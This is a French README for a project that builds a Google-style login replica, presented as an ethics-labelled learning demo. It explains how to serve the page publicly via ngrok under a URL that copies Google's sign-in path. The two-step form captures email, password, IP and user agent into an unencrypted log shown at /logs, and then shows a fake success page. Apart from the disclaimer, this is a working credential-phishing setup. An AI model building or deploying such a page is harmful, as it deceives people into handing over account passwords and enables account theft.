# defi — démo éthique d'apprentissage

Réplique **pédagogique** d'une page de connexion *style Google*.
But : comprendre le **stockage objet JSON**, un serveur **Node.js natif (sans Express)**
et un **tunnel réseau `ngrok`**.

> ⚠️ Éthique / learning‑only. Aucune donnée n’est chiffrée (volontaire, cf. demande)
> et **`data/logs.json` est exclu du repo** (`.gitignore`). À ne **pas** exposer publiquement.

## Stack
- HTML · CSS · JavaScript (navigateur) — Tailwind CDN (CSS) + JS natif
- Node.js (`http`, `fs`, `path`, `url`) — modules natifs, **zéro dépendance npm**
- `ngrok` pour le tunnel public

## Lancement local

```bash
git clone https://github.com/Leboueelie/defi.git
cd defi
npm start          # → écoute sur http://localhost:3000
```

## Tunnel ngrok (Internet)

Dans un second terminal :

```bash
ngrok http 3000 --host-header="localhost:3000"
# → https://<aléatoire>.ngrok.io
```

Puis ouvrez l’URL **longue style Google** (le serveur répond à ce chemin) :

```
https://<aléatoire>.ngrok.io/v3/signin/identifier?continue=https%3A%2F%2Faccounts.google.com%2F&dsh=S-684035207%3A1786225401411884&followup=https%3A%2F%2Faccounts.google.com%2F&passive=1209600&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=Ac50bxt5aymdFYKXw-3UoRQ0Bpv7ft0-gjpTEmhCbbk5oU9lf4JLITrg_MBtV8cXMFjGLRkKTavp-Q
```

## UX — Double étape (comme Google)

| Étape | Description |
|---|---|
| 1 | Saisie de l’adresse e-mail → validation → transition |
| 2 | Saisie du mot de passe (affichage/masquage via checkbox) → `POST /login` |
| ✓ | Redirection `303 → /success` (données enregistrées dans `data/logs.json`) |

## Routes

| Méthode | Chemin | Action |
|---|---|---|
| `GET`  | `/v3/signin/identifier?...` (ou `/`) | formulaire login (deux étapes) |
| `POST` | `/login` | enregistre `{email,password,ip,created_at,user_agent}` → `data/logs.json`, redirige `303` → `/success` |
| `GET`  | `/logs` | affiche le JSON **brut, non chiffré** |
| `GET`  | `/success` | page "Connexion réussie" (après POST /login) |
| `GET`  | `/style.css`, `/app.js` | statiques |

## Stockage

`data/logs.json` : tableau d'objets créé automatiquement, append‑only.
Exclu du git (`git rm --cached data/logs.json` s'il a fui).

## Reset données (entre les démos)

```bash
echo '[]' > data/logs.json
```

## License

MIT — usage strictement pédagogique.
